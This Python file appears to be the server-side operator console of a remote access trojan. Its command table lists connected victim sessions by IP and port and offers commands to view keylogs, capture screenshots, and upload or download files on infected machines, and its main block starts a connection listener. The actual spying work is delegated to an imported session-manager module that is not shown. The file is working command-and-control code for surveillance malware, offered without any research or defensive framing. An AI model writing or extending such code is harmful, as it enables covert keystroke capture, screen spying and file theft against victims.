import socket
import threading
import time

import utility

# import settings
import modules.session_manager as sm


class ServerInterface:
    def __init__(self, manager: sm.SessionManager) -> None:
        self._prefix = "Server $ "
        self._active = False
        self._manager = manager
        self._commands = {
            "help": {"desc": "Display this list of commands", "func": self._help},
            "sessions": {
                "desc": "Display a list of active sessions",
                "func": self._sessions,
            },
            "keylogs": {
                "desc": "View the keylogs of a session",
                "args": ["<session_id>"],
            },
            "upload": {
                "desc": "Upload a file to a session",
                "args": ["<session_id>", "<file_path>", "<remote_path>"],
            },
            "download": {
                "desc": "Download a file from a session",
                "args": ["<session_id>", "<file_path>"],
            },
            "screenshot": {
                "desc": "Capture a screenshot from a session",
                "args": ["<session_id>"],
            },
            "exit": {"desc": "Exit/shutdown the server", "func": self._exit},
        }

    # getters ------------------------------------------------------------

    def get_command(self, command: str) -> callable or None:
        return self._commands.get(command)

    # input --------------------------------------------------------------

    def start(self) -> None:
        self._active = True
        while self._active:
            command, *args = input(self._prefix).strip().split(" ")
            self._handle_command(command, *args)

    # command handling ---------------------------------------------------

    def _handle_command(self, command: str, *args) -> None:
        cmd = self.get_command(command)
        if not cmd:
            return (
                utility.Response.err(f"{command} is not a valid command")
                if len(command) > 0
                else ""
            )
        if "func" in cmd.keys():
            cmd["func"](*(args[: cmd["func"].__code__.co_argcount - 1]))
        else:
            try:
                self._manager.execute_on_session(command, *args)
            except Exception as e:
                print(e)
                print(f"\n[-] Usage: {command} {' '.join(cmd['args'])}\n")

    def _help(self) -> None:
        arg_padding = len(
            max(
                (", ".join(x.get("args", [])) for x in self._commands.values()), key=len
            )
        )
        command_padding = len(max(self._commands.keys(), key=len))
        print(
            "\n"
            + f"{'COMMAND':<{command_padding + 5}}{'ARGUMENTS':<{arg_padding + 5}}DESCRIPTION\n\n"
            + "\n".join(
                (
                    f"{cmd:<{command_padding + 5}}"
                    + f"{', '.join(info.get('args', [])):<{arg_padding + 5}}"
                    + f"{info.get('desc')}"
                )
                for cmd, info in self._commands.items()
            )
            + "\n"
        )

    def _sessions(self) -> None:
        sessions = self._manager.get_sessions()
        if not sessions:
            output = "No active sessions"
        else:
            output = f"{'ID':<5}  {'IP':<10}  {'PORT':<10}\n\n" + "\n".join(
                "{:<5}  {:<10}  {:<10}".format(s.sid, *s.conn.getpeername())
                for s in sessions
            )
        print(f"\n{output}\n")

    def _exit(self) -> None:
        self._active = False


if __name__ == "__main__":
    manager = sm.SessionManager()
    manager.connection_listener()
    interface = ServerInterface(manager)
    try:
        interface.start()
    except KeyboardInterrupt:
        pass
